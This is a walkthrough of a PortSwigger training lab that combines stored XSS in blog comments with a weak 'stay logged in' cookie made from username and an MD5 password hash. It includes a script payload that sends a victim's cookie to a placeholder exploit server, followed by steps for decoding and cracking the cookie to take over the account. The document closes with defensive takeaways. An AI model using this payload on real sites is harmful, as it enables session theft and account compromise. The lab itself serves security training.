#  Offline password cracking

## üìå Lab Details
- **Title**: Offline password cracking
- **Difficulty**: Practitioner
- **Category**: Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/151f941feb521716a2b1005d474bcf3f4ad34dee8790c892af3e36c88c22a128?referrer=%2fweb-security%2fauthentication%2fother-mechanisms%2flab-offline-password-cracking

## üîç Summary
The lab combines a stored XSS on the blog comments with an insecure "stay logged in" cookie that stores username:md5(password) Base64‚Äëencoded. By injecting a stored XSS payload you capture Carlos‚Äôs cookie on the exploit server and then decode it to access the account.

## üõ† Steps to Solve
1. Use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
2. Go to the Response to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:<br>
`username+':'+md5HashOfPassword`
3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
   ```sh
   <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
   ```
5. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
6. Decode the cookie in Burp Decoder.
7. Decode the **hash** to find the password.
8. Log into the account and delete the account to complete the lab.

## üìñ Key Takeaways
- **Base64 ‚â† encryption** ‚Äî encoding the cookie in Base64 only hides format; anyone who gets the value can decode it.
- Do not store raw or unsalted password hashes in client-side cookies. Storing `username:md5(password)` lets an attacker perform offline cracking or lookup easily.
- Use cookie protections ‚Äî mark sensitive cookies `HttpOnly`, `Secure` and consider `SameSite` to reduce theft via client-side scripts or cross-site requests.
